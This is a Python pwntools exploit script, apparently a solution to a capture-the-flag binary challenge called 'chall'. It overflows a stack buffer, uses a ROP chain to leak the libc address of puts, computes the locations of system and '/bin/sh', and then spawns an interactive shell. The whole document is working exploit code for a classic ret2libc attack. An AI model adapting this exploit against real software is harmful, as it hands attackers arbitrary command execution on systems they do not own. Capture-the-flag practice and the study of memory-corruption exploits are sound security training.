#!/bin/python3

from pwn import *

#elf = ELF("./chall_patched")
elf = ELF("./chall")
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-2.35.so")
context.binary = elf

r = process([elf.path])

padding = b"A"*112 + b"B"*8
ret = p64(0x40101a)             # ROPgadget --binary chall | grep ret
poprdi = p64(0x4011de)          # ROPgadget --binary chall | grep "pop rdi"
puts_at_got = p64(0x403fc0)     # GOT table
puts_at_plt = p64(elf.plt['puts'])     # PLT section
main_addr = p64(0x401371)       # main start address

r.recvuntil(b"> ")
r.sendline(b"3")
r.sendline(padding + poprdi + puts_at_got + puts_at_plt + main_addr)
r.recvuntil(b'blacklisted!\n')
leaked_addr = u64(r.recvline().rstrip().ljust(8, b"\x00"))
print(f"Leaked address: {hex(leaked_addr)}") # assume 0x0a is not in the leaked address

libc = ELF("libc.so.6")
libc_base = leaked_addr - libc.sym["puts"]
system = libc_base + libc.sym["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh\x00"))

r.sendline(b"3")
r.sendline(padding + ret + poprdi + p64(bin_sh) + p64(system))
r.interactive()
